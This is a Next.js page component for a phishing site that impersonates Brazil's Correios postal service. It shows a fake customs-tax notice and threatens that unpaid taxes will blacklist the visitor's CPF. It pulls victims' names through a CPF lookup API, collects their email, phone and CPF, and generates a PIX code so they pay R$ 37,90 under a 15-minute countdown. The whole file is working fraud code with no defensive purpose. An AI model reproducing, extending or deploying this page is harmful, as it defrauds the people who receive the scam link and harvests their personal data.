"use client"

import type React from "react"
import Link from "next/link"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { AlertTriangle, QrCode, Copy, Check, Clock } from "lucide-react"
import { useState, useEffect, useRef } from "react"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { useSearchParams } from "next/navigation"
import { consultarCPF } from "@/lib/cpf-api"
import {
  trackPageView,
  trackPaymentPageView,
  trackPixGenerated,
  trackFormSubmission,
} from "@/components/google-analytics"

interface ClientData {
  cpf: string
  nome: string
  status: string
  encomenda: {
    codigo: string
    status: string
    produto: string
    valor: string
  }
}

export default function PagamentoPage() {
  const searchParams = useSearchParams()
  const idParam = searchParams.get("id")
  const [clientData, setClientData] = useState<ClientData | null>(null)
  const [loading, setLoading] = useState(false)

  // Buscar dados do cliente quando a página carregar
  useEffect(() => {
    const fetchClientData = async () => {
      if (!idParam) return

      setLoading(true)
      try {
        const result = await consultarCPF(idParam)
        if (result.success && result.data) {
          setClientData(result.data)
        }
      } catch (error) {
        console.error("Erro ao buscar dados do cliente:", error)
      } finally {
        setLoading(false)
      }
    }

    fetchClientData()
  }, [idParam])

  useEffect(() => {
    trackPageView("Página de Pagamento")
    trackPaymentPageView()
  }, [])

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-white border-b border-gray-200 py-2 px-4 sticky top-0 z-10">
        <div className="max-w-7xl mx-auto">
          <div className="flex justify-between items-center">
            <div className="flex items-center">
              <Image src="/correios-logo.png" alt="Correios" width={300} height={60} className="h-7 w-auto" priority />
            </div>
            <div className="text-xs">
              <Link href="#" className="text-blue-600 hover:underline">
                Acessibilidade
              </Link>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-grow bg-white">
        <div className="max-w-3xl mx-auto px-4 py-4 sm:py-6">
          <div className="mb-4 sm:mb-6">
            <nav className="text-sm sm:text-base text-blue-600 overflow-x-auto whitespace-nowrap pb-1">
              <Link href="/" className="hover:underline">
                Portal Correios
              </Link>{" "}
              &gt;{" "}
              <Link href="#" className="hover:underline">
                Rastreamento
              </Link>{" "}
              &gt; Pagamento
            </nav>
          </div>

          <h1 className="text-xl sm:text-2xl font-bold text-blue-800 mb-4 sm:mb-6">Pagamento de Taxas Alfandegárias</h1>

          {/* Aviso sobre consequências do atraso */}
          <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-6">
            <div className="flex items-start gap-2">
              <AlertTriangle className="h-5 w-5 text-red-500 flex-shrink-0 mt-0.5" />
              <div>
                <h3 className="font-bold text-red-700 mb-2">ATENÇÃO:</h3>
                <p className="text-red-700 mb-2">
                  Seu pacote chegou ao Brasil, e foi taxado em R$ 37,90 por estar acima do peso ou valor.
                </p>
                <p className="text-red-700 mb-2">
                  Prazo de entrega em 3 dias úteis pelos Correios após baixa no imposto ICMS.
                </p>
                <p className="text-red-700">Impostos não pagos resultarão na negativação do CPF na Receita Federal.</p>
              </div>
            </div>
          </div>

          <PaymentInfo clientData={clientData} isLoading={loading} />
        </div>
      </main>

      <footer className="bg-yellow-400 py-8">
        <div className="max-w-6xl mx-auto px-4 text-center">
          <p className="text-sm">Central de Atendimento: 0800 725 0100</p>
        </div>
      </footer>
    </div>
  )
}

interface PaymentInfoProps {
  clientData: ClientData | null
  isLoading: boolean
}

function PaymentInfo({ clientData, isLoading }: PaymentInfoProps) {
  const [email, setEmail] = useState("")
  const [phone, setPhone] = useState("")
  const [fullName, setFullName] = useState("")
  const [cpf, setCpf] = useState("")
  const [copied, setCopied] = useState(false)
  const [timeLeft, setTimeLeft] = useState(900) // 15 minutos em segundos
  const timerRef = useRef<NodeJS.Timeout | null>(null)
  const fixedPrice = 37.9
  const formattedPrice = fixedPrice.toFixed(2).replace(".", ",")
  const [pixCode, setPixCode] = useState("")
  const [pixGenerated, setPixGenerated] = useState(false)
  const [generatingPix, setGeneratingPix] = useState(false)
  const [transactionId, setTransactionId] = useState("")

  // Preencher os campos com os dados do cliente quando disponíveis
  useEffect(() => {
    if (clientData) {
      setFullName(clientData.nome || "")
      setCpf(clientData.cpf || "")
    }
  }, [clientData])

  // Iniciar timer quando o componente carregar
  useEffect(() => {
    if (timeLeft > 0) {
      timerRef.current = setInterval(() => {
        setTimeLeft((prev) => {
          if (prev <= 1) {
            if (timerRef.current) clearInterval(timerRef.current)
            return 0
          }
          return prev - 1
        })
      }, 1000)
    }

    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [])

  // Formatar o tempo restante
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Função para formatar o CPF enquanto o usuário digita
  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    const digits = value.replace(/\D/g, "")
    let formatted = ""

    if (digits.length > 0) formatted += digits.substring(0, Math.min(3, digits.length))
    if (digits.length > 3) formatted += "." + digits.substring(3, Math.min(6, digits.length))
    if (digits.length > 6) formatted += "." + digits.substring(6, Math.min(9, digits.length))
    if (digits.length > 9) formatted += "-" + digits.substring(9, Math.min(11, digits.length))

    setCpf(formatted)
  }

  // Função para formatar o telefone enquanto o usuário digita
  const formatPhone = (value: string) => {
    const digits = value.replace(/\D/g, "")
    let formatted = ""

    if (digits.length > 0) formatted += "(" + digits.substring(0, Math.min(2, digits.length))
    if (digits.length > 2) formatted += ") " + digits.substring(2, Math.min(7, digits.length))
    if (digits.length > 7) formatted += "-" + digits.substring(7, Math.min(11, digits.length))

    return formatted
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatPhone(e.target.value)
    setPhone(formattedValue)
  }

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(pixCode)
      setCopied(true)

      // Reset copied state after 2 seconds
      setTimeout(() => {
        setCopied(false)
      }, 2000)
    } catch (err) {
      console.error("Failed to copy text: ", err)
    }
  }

  const generatePix = async () => {
    if (!fullName || !email || !phone || !cpf) {
      alert("Por favor, preencha todos os dados obrigatórios")
      return
    }

    // Rastrear preenchimento do formulário
    trackFormSubmission("dados_pagamento")

    setGeneratingPix(true)
    try {
      const response = await fetch("/api/generate-pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          name: fullName,
          email: email,
          phone: phone,
          cpf: cpf,
        }),
      })

      const result = await response.json()

      if (result.success) {
        setPixCode(result.qrcode)
        setTransactionId(result.transactionId)
        setPixGenerated(true)
        // Rastrear geração do PIX
        trackPixGenerated(3790) // Valor em centavos
        // Iniciar timer de 15 minutos
        setTimeLeft(900)
      } else {
        alert(result.error || "Erro ao gerar PIX")
      }
    } catch (error) {
      console.error("Erro:", error)
      alert("Erro ao gerar PIX. Tente novamente.")
    } finally {
      setGeneratingPix(false)
    }
  }

  return (
    <>
      {/* Identificação do Cliente */}
      <Card className="mb-5 sm:mb-6">
        <CardHeader className="bg-blue-50 p-4 sm:p-6">
          <CardTitle>Identificação</CardTitle>
          <CardDescription>Dados do destinatário da encomenda</CardDescription>
        </CardHeader>
        <CardContent className="p-4 sm:p-6">
          {isLoading ? (
            <div className="flex justify-center items-center py-8">
              <span className="ml-2">Carregando dados do cliente...</span>
            </div>
          ) : (
            <div className="space-y-4">
              <div>
                <Label htmlFor="fullName">Nome completo</Label>
                <Input
                  id="fullName"
                  type="text"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  className="mt-1"
                />
              </div>

              <div>
                <Label htmlFor="email">E-mail</Label>
                <Input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="mt-1"
                />
              </div>

              <div>
                <Label htmlFor="phone">Telefone</Label>
                <Input id="phone" type="tel" value={phone} onChange={handlePhoneChange} className="mt-1" />
              </div>

              <div>
                <Label htmlFor="cpf">CPF</Label>
                <Input id="cpf" type="text" value={cpf} onChange={handleCPFChange} className="mt-1" />
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Resumo da Cobrança */}
      <Card className="mb-5 sm:mb-6">
        <CardHeader className="bg-blue-50 p-4 sm:p-6">
          <CardTitle>Resumo da Cobrança</CardTitle>
          <CardDescription>Detalhes das taxas aplicáveis à sua encomenda</CardDescription>
        </CardHeader>
        <CardContent className="p-4 sm:p-6">
          <div className="space-y-5 sm:space-y-6">
            <div className="flex justify-between">
              <span>ICMS:</span>
              <span className="font-medium">R$ {formattedPrice}</span>
            </div>

            <div className="border-t pt-2 flex justify-between font-bold">
              <span>Total a pagar:</span>
              <span>R$ {formattedPrice}</span>
            </div>
          </div>
        </CardContent>
      </Card>

      <Card className="mb-6 sm:mb-8">
        <CardHeader className="bg-blue-50 p-4 sm:p-6">
          <CardTitle className="flex items-center gap-2">
            <QrCode className="h-5 w-5" />
            Pagamento via PIX
          </CardTitle>
          <CardDescription>Copie o código PIX abaixo e cole no aplicativo do seu banco</CardDescription>
        </CardHeader>
        <CardContent className="p-4 sm:p-6 text-center">
          {!pixGenerated ? (
            <div className="text-center">
              <Button
                onClick={generatePix}
                disabled={generatingPix || !fullName || !email || !phone || !cpf}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white mb-4"
              >
                {generatingPix ? "Gerando PIX..." : "Gerar código PIX"}
              </Button>
              <p className="text-sm text-gray-500">Preencha todos os dados acima para gerar o código PIX</p>
            </div>
          ) : (
            <>
              {/* Timer de expiração */}
              <div className="mb-4 flex items-center justify-center gap-2 text-sm">
                <Clock className="h-4 w-4 text-red-500" />
                <span className="font-medium">
                  Tempo restante:{" "}
                  <span className={`${timeLeft < 60 ? "text-red-500" : "text-gray-700"}`}>{formatTime(timeLeft)}</span>
                </span>
              </div>

              <div className="mb-5 sm:mb-6">
                <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center mb-2 gap-2">
                  <p className="text-sm text-gray-500">Copie o código PIX abaixo:</p>
                  <Button
                    onClick={copyToClipboard}
                    variant="outline"
                    size="sm"
                    className="flex items-center gap-1 bg-transparent"
                  >
                    {copied ? (
                      <>
                        <Check className="h-4 w-4 text-green-500" />
                        <span className="text-green-500">Copiado!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="h-4 w-4" />
                        <span>Copiar código</span>
                      </>
                    )}
                  </Button>
                </div>
                <div className="bg-gray-100 p-3 rounded-md text-sm font-mono break-all">{pixCode}</div>
              </div>

              <div className="flex items-center justify-center gap-2 mb-4 text-sm text-gray-600">
                <Clock className="h-4 w-4" />
                <span>Pague e o valor será creditado na hora</span>
              </div>

              <div className="flex flex-col sm:flex-row gap-3 mb-5">
                <Button onClick={copyToClipboard} className="w-full bg-blue-600 hover:bg-blue-700 text-white">
                  Copiar código PIX
                </Button>
              </div>
            </>
          )}

          <div className="bg-yellow-50 p-4 rounded-md text-sm border border-yellow-200">
            <p className="font-medium">Importante:</p>
            <ul className="list-disc list-inside mt-2 space-y-1 text-left">
              <li>O pagamento será confirmado em até 30 minutos</li>
              <li>Após a confirmação, sua encomenda será liberada para entrega</li>
              <li>Você receberá um e-mail com a confirmação do pagamento</li>
            </ul>
          </div>
        </CardContent>
      </Card>

      <div className="text-center text-sm text-gray-500">
        <p>
          Ao efetuar o pagamento, você concorda com os{" "}
          <Link href="#" className="text-blue-600 hover:underline">
            termos e condições
          </Link>{" "}
          dos Correios.
        </p>
      </div>
    </>
  )
}
